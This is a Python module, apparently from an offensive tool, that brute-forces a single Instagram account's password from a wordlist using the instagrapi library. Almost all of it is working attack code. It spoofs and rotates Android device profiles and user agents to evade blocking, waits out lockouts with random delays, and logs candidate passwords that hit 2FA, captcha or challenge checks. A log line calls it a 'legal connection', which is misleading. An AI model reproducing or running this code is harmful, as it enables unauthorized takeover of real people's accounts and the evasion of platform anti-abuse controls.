import re
import time
import random
import requests
from pathlib import Path
from .printit import PrintIt
from instagrapi import Client
from instagrapi.exceptions import UnknownError, BadPassword, CaptchaChallengeRequired, TwoFactorRequired, ChallengeRequired

USERNAME_RE = re.compile(r"^(?!.*\.\.)(?!\.)[a-z0-9_\.]{1,30}(?!\.)$")

class IgTools:
    devices = [
        {"manufacturer": "Samsung", "model": "Galaxy S20", "android_version": 30, "android_release": "11", "dpi": "480dpi", "resolution": "1440x3200"},
        {"manufacturer": "Google", "model": "Pixel 5", "android_version": 30, "android_release": "11", "dpi": "440dpi", "resolution": "1080x2340"},
        {"manufacturer": "Xiaomi", "model": "Mi 9", "android_version": 29, "android_release": "10", "dpi": "420dpi", "resolution": "1080x2340"},
        {"manufacturer": "OnePlus", "model": "8T", "android_version": 30, "android_release": "11", "dpi": "440dpi", "resolution": "1080x2400"},
        {"manufacturer": "Samsung", "model": "Galaxy Note 20", "android_version": 30, "android_release": "11", "dpi": "500dpi", "resolution": "1440x3088"},
        {"manufacturer": "Google", "model": "Pixel 6", "android_version": 31, "android_release": "12", "dpi": "440dpi", "resolution": "1080x2400"},
        {"manufacturer": "Samsung", "model": "Galaxy S21", "android_version": 31, "android_release": "12", "dpi": "480dpi", "resolution": "1440x3200"},
        {"manufacturer": "Xiaomi", "model": "Mi 11", "android_version": 31, "android_release": "12", "dpi": "420dpi", "resolution": "1440x3200"},
        {"manufacturer": "OnePlus", "model": "9 Pro", "android_version": 31, "android_release": "12", "dpi": "440dpi", "resolution": "1440x3216"},
        {"manufacturer": "Samsung", "model": "Galaxy Z Fold 3", "android_version": 31, "android_release": "12", "dpi": "420dpi", "resolution": "1768x2208"},
        {"manufacturer": "Google", "model": "Pixel 4 XL", "android_version": 30, "android_release": "11", "dpi": "560dpi", "resolution": "1440x3040"},
        {"manufacturer": "Samsung", "model": "Galaxy S10", "android_version": 29, "android_release": "10", "dpi": "550dpi", "resolution": "1440x3040"},
        {"manufacturer": "Xiaomi", "model": "Redmi Note 10", "android_version": 30, "android_release": "11", "dpi": "420dpi", "resolution": "1080x2400"},
        {"manufacturer": "OnePlus", "model": "7T", "android_version": 29, "android_release": "10", "dpi": "420dpi", "resolution": "1080x2400"},
        {"manufacturer": "Samsung", "model": "Galaxy A72", "android_version": 30, "android_release": "11", "dpi": "420dpi", "resolution": "1080x2400"},
        {"manufacturer": "Google", "model": "Pixel 3a XL", "android_version": 29, "android_release": "10", "dpi": "400dpi", "resolution": "1080x2160"},
        {"manufacturer": "Xiaomi", "model": "Mi 10", "android_version": 30, "android_release": "11", "dpi": "440dpi", "resolution": "1080x2340"},
        {"manufacturer": "OnePlus", "model": "8 Pro", "android_version": 30, "android_release": "11", "dpi": "500dpi", "resolution": "1440x3168"},
        {"manufacturer": "Samsung", "model": "Galaxy S22", "android_version": 32, "android_release": "12", "dpi": "500dpi", "resolution": "1440x3088"},
        {"manufacturer": "Google", "model": "Pixel 7 Pro", "android_version": 32, "android_release": "13", "dpi": "520dpi", "resolution": "1440x3120"},
    ]
    
    user_agents = [
        "Instagram 300.0.0.0 Android (30/11; 480dpi; 1440x3200; Samsung; Galaxy S20)",
        "Instagram 300.0.0.0 Android (30/11; 440dpi; 1080x2340; Google; Pixel 5)",
        "Instagram 300.0.0.0 Android (29/10; 420dpi; 1080x2340; Xiaomi; Mi 9)",
        "Instagram 300.0.0.0 Android (30/11; 440dpi; 1080x2400; OnePlus; 8T)",
        "Instagram 300.0.0.0 Android (30/11; 500dpi; 1440x3088; Samsung; Galaxy Note 20)",
        "Instagram 300.0.0.0 Android (31/12; 440dpi; 1080x2400; Google; Pixel 6)",
        "Instagram 300.0.0.0 Android (31/12; 480dpi; 1440x3200; Samsung; Galaxy S21)",
        "Instagram 300.0.0.0 Android (31/12; 420dpi; 1440x3200; Xiaomi; Mi 11)",
        "Instagram 300.0.0.0 Android (31/12; 440dpi; 1440x3216; OnePlus; 9 Pro)",
        "Instagram 300.0.0.0 Android (31/12; 420dpi; 1768x2208; Samsung; Galaxy Z Fold 3)",
        "Instagram 300.0.0.0 Android (30/11; 560dpi; 1440x3040; Google; Pixel 4 XL)",
        "Instagram 300.0.0.0 Android (29/10; 550dpi; 1440x3040; Samsung; Galaxy S10)",
        "Instagram 300.0.0.0 Android (30/11; 420dpi; 1080x2400; Xiaomi; Redmi Note 10)",
        "Instagram 300.0.0.0 Android (29/10; 420dpi; 1080x2400; OnePlus; 7T)",
        "Instagram 300.0.0.0 Android (30/11; 420dpi; 1080x2400; Samsung; Galaxy A72)",
        "Instagram 300.0.0.0 Android (29/10; 400dpi; 1080x2160; Google; Pixel 3a XL)",
        "Instagram 300.0.0.0 Android (30/11; 440dpi; 1080x2340; Xiaomi; Mi 10)",
        "Instagram 300.0.0.0 Android (30/11; 500dpi; 1440x3168; OnePlus; 8 Pro)",
        "Instagram 300.0.0.0 Android (32/12; 500dpi; 1440x3088; Samsung; Galaxy S22)",
        "Instagram 300.0.0.0 Android (32/13; 520dpi; 1440x3120; Google; Pixel 7 Pro)",
    ]
    
    @staticmethod
    def verify_username(username):
        username_strip = username.maketrans({ord(c): None for c in "!@$#%&*()[]{}|\\;:=,<>-*/+\"' "})
        username = username.translate(username_strip)
        conditions = [
            username != None,
            username != int,
            len(username) <= 30,
            len(username) > 1,
            USERNAME_RE.fullmatch(username)
        ]
        
        if all(conditions):
            return username
        
        return None
        
    @staticmethod
    def check_ig_connection():
        c = requests.get("https://instagram.com/")
        return c.status_code == 200 and c.text != None
        
    @staticmethod
    def random_ig_user_agent():
        r = random.randint(0,19)
        return (IgTools.user_agents[r], IgTools.devices[r])
        
    @staticmethod
    def read_wordlist(wordlist):
        try:
            wordlist = Path(wordlist)
            if wordlist.is_file() and wordlist.exists():
                data = wordlist.read_text().splitlines()
                return [password for password in data if len(password) >= 6]
                
        except Exception:
            return []
                    
class IgInteract:
    
    def __init__(self, username: str, wordlist: Path, timeout=5):
        u = IgTools.verify_username(username)
        w = IgTools.read_wordlist(wordlist)
        if u != None:
            self.username = u
        else:
            raise ValueError("Invalid username suplied.")
            
        if w not in ([], None):
            self.wordlist = w
        else:
            raise ValueError("Invalid wordlist provided.")
            
        self.timeout = timeout if 5 <= timeout <= 60 else 5
            
        self.print_it = PrintIt
            
    def ig_connect(self):
        user_agent, headers = IgTools.random_ig_user_agent()
        if self.wordlist not in ([], None):
            self.print_it.info(f"Starting IG legal connection on {self.username}...")
            attempts = 0
            rotation = 0
            for item in self.wordlist:
                try:
                    c = Client()
                    c.set_device(headers)
                    c.set_user_agent(user_agent)
                    c.login(self.username, item)
                
                except UnknownError:
                    if attempts > 0:
                        self.print_it.error(f"Request blocked, attempting rotation to \"{user_agent}\"")
                        user_agent, headers = IgTools.random_ig_user_agent()
                        if rotation > 2:
                            self.print_it.info(f"Total Attempts: {attempts}")
                            
                        rotation += 1
                        
                    else:
                        self.print_it.error(f"Username \"{self.username}\" dont exists or you have been blocked in ig.")
                        r = self.print_it.yes_no(f"Do you want to continue this attack? the program will wait the blocked timeout")
                        if r:
                            random_timeout = random.randint(180,2800)
                            for seconds in range(random_timeout, 0, -1):
                                self.print_it.info(f"Waiting {seconds} seconds for continue.")
                                time.sleep(1)
                                
                        else:
                            self.print_it.error(f"User stoped.")
                            break

                except TwoFactorRequired:
                    self.print_it.error(f"2FA Required to login in this account, user:{self.username}:password:{item}")
                    break

                except BadPassword:
                    self.print_it.warning(f"Bad password: {item}")

                except CaptchaChallengeRequired:
                    self.print_it.error(f"Captcha required, user:{self.username}:password:{item}\n\r")

                except ChallengeRequired as e:
                    self.print_it.error(f"Challenge required, URL: {e.challenge_url} user:{self.username}:password:{item}")
                    break

                except KeyboardInterrupt:
                    self.print_it.error(f"User aborted.")
                    break

                except Exception as e:
                    self.print_it.error(f"Error: {str(e)}, {self.username, item}")
                    break
                    
                attempts += 1
                time.sleep(random.uniform(0, self.timeout))

